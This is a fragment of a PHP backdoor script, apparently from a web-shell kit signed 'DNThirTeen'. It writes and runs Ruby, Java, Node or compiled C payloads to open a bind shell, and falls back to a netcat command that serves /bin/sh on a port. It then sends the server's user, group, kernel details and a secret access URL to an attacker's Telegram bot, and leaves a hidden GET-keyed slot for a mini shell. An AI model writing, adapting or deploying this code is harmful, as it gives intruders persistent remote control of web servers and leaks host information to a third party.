            $lang = ".rb";
            $name = $tmpdir . '/' . $rand0m . $lang;
            $f_bp = fopen($name, "w");
            fwrite($f_bp, __DwixRMX($ruby));
            fclose($f_bp);
            $out = D3g1d5Ex("ruby $name $port $os");
            sleep(1);
            if ($out) {
                $output = "Success! Backdoor Opened On Port : " . $port . ", With : " . $lang . " Languange";
                @backd00r();
            }
            unlink($name);
            $_SESSION['ruby'] = true;
        }
        else if (!isset($_SESSION['ruby']) && $xjava == 'on') {
            $lang = ".java";
            $name = $tmpdir . '/' . $rand0m . $lang;
            $f_bp = fopen($name, "w");
            fwrite($f_bp, __DwixRMX($java));
            fclose($f_bp);
            $out = D3g1d5Ex("java $name $port $os");
            sleep(1);
            if ($out) {
                $output = "Success! Backdoor Opened On Port : " . $port . ", With : " . $lang . " Languange";
                @backd00r();
            }
            unlink($name);
            $_SESSION['java'] = true;
        }
        else if (!isset($_SESSION['java']) && $xnode == 'on') {
            $lang = ".js";
            $name = $tmpdir . '/' . $rand0m . $lang;
            $f_bp = fopen($name, "w");
            fwrite($f_bp, __DwixRMX($node));
            fclose($f_bp);
            $out = D3g1d5Ex("node $name $port $os");
            sleep(1);
            if ($out) {
                $output = "Success! Backdoor Opened On Port : " . $port . ", With : " . $lang . " Languange";
                @backd00r();
            }
            unlink($name);
            $_SESSION['node'] = true;
        }
        else if (!isset($_SESSION['node']) && $xgcc == 'on') {
            $lang = ".c";
            $name = $tmpdir . '/' . $rand0m . $lang;
            $loc = $tmpdir . '/' . uniqid() . rand(1, 99999);
            $f_bp = fopen($name, "w");
            fwrite($f_bp, __DwixRMX($c));
            fclose($f_bp);
            D3g1d5Ex("gcc $name -o $loc");
            D3g1d5Ex("chmod +x $loc");
            $out = D3g1d5Ex("./$loc $port $os");
            sleep(1);
            if ($out) {
                $output = "Success! Backdoor Opened On Port : " . $port . ", With : " . $lang . " Languange";
                @backd00r();
            }
            unlink($name);
            unlink($loc);
            $_SESSION['gcc'] = true;
        }
        else if (!isset($_SESSION['gcc']) && $xnc == 'on') {
            $out = D3g1d5Ex("nc -lvp $port -e /bin/sh");
            sleep(1);
            if ($out) {
                $output = "Success! Backdoor Opened On Port : " . $port . ", With : netcat traditional";
                @backd00r();
            }
            else {
                $output = "Can't Open Bind Shell :(";
            }
        }
        else {
            @backd00r();
        }
    }

    //===========================================//
    if (!function_exists('posix_getegid')) {
        $user = @get_current_user();
        $uid = @getmyuid();
        $gid = @getmygid();
        $group = "?";
    }
    else {
        $uid = @posix_getpwuid(posix_geteuid());
        $gid = @posix_getgrgid(posix_getegid());
        $user = $uid['name'];
        $uid = $uid['uid'];
        $group = $gid['name'];
        $gid = $gid['gid'];
    }

    $token = "xxxxxxxxxx:xxxxxxxxxxx_xxxxxxxxxxxxxx"; //Put your bot's token here
    $text = "===[DnThirTeen_L0gz]===" . "\n";
    $text .= "Link Log : " . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "?DNThirTeen=L34kC0de" . "\n";
    $text .= "User : " . $user . [".$uid."] . " Group: " . $group . [".$gid."] . "\n";
    $text .= "Kernel : " . php_uname() . "\n";
    $text .= "=====[Bind Shell]=====" . "\n";
    $text .= "Languange : " . $lang . "\n";
    $text .= "Port : " . $port . "\n";
    $text .= "Status : " . $output . "\n";
    $text .= "=====[File Shell]=====" . "\n";
    $text .= "Status : " . $outfile . "\n";
    $text .= "======================";
    $data = ['text' => $text, 'chat_id' => 'xxxxxxxxxxx']; //Put Your chat id here
    @file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));
    $handle = fopen($tmpfname, "w+");
    fwrite($handle, "DNThirTeen Was Here!");
    fclose($handle);
}

if (isset($_GET["DNThirTeen"]) && $_GET["DNThirTeen"] == "L34kC0de") {
    //Put Your Mini Shell Here
}
?>
